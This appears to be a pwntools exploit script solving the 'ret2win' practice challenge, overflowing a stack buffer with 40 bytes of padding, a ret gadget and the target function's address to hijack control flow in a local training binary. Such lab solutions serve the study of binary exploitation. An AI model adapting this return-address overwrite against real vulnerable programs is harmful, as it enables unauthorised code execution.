#!/usr/bin/python3

from pwn import *

elf = ELF("./ret2win")
rop = ROP(elf)

payload = (
    b"A" * 40 +
    p64(rop.find_gadget(["ret"])[0]) +
    p64(elf.symbols["ret2win"])
)

ps = process(elf.path)
ps.sendline(payload)
print(ps.recvall().decode())

